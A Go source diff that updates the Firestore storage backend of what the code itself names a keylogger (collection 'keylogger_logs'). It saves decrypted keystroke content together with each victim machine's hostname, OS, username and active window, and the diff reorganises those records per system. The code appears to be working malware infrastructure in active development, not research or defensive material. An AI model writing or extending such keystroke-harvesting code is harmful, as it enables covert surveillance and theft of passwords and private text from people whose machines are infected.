@@ -6,6 +6,8 @@ import (
 	"os"
 	"path/filepath"
 	"time"
+
+	"cloud.google.com/go/firestore"
 )
 
 // creates an interface for saving logs, can implement using firebase or local files
@@ -69,22 +71,39 @@ func (fs *FirebaseSaver) Save(payload LogPayload, decryptedContent string) error
 		return fmt.Errorf("FirebaseSaver: Firestore client not initialized")
 	}
 
+	systemID := payload.SystemInfo.SystemID
+	systemsCollection := firestoreClient.Collection("systems")
+	systemDocRef := systemsCollection.Doc(systemID)
+
+	systemData := FirebaseSystemInfo{
+		SystemID:  systemID,
+		Hostname:  payload.SystemInfo.Hostname,
+		OS:        payload.SystemInfo.OS,
+		OSRelease: payload.SystemInfo.OSRelease,
+		Username:  payload.SystemInfo.Username,
+	}
+
+	// Use Set with firestore.MergeAll to update existing or create new document
+	_, err := systemDocRef.Set(ctx, systemData, firestore.MergeAll)
+	if err != nil {
+		return fmt.Errorf("FirebaseSaver: failed to save/update system info for %s: %w", systemID, err)
+	}
+	log.Printf("FirebaseSaver: System info for %s saved/updated in 'systems' collection.", systemID)
+
 	entry := LogEntry{
-		SystemInfo:         payload.SystemInfo,
 		LogStartTimeUTC:    payload.LogStartTimeUTC,
 		LogDurationSeconds: payload.LogDurationSeconds,
 		LoggedContent:      decryptedContent,
+		ActiveWindow:       payload.SystemInfo.ActiveWindow,
 		ServerTimestamp:    time.Now(),
 	}
 
-	collectionPath := "keylogger_logs"
-	docID := payload.SystemInfo.SystemID
-
-	_, _, err := firestoreClient.Collection(collectionPath).Doc(docID).Collection("batches").Add(ctx, entry)
+	// add the log entry to the "batches" subcollection under the specific system's document
+	_, _, err = systemDocRef.Collection("batches").Add(ctx, entry)
 	if err != nil {
-		return fmt.Errorf("FirebaseSaver: failed to add log document to Firestore: %w", err)
+		return fmt.Errorf("FirebaseSaver: failed to add log document to Firestore for system %s: %w", systemID, err)
 	}
 
-	log.Printf("FirebaseSaver: Log batch from system %s saved to Firestore.", payload.SystemInfo.SystemID)
+	log.Printf("FirebaseSaver: Log batch from system %s saved to Firestore subcollection.", systemID)
 	return nil
 }
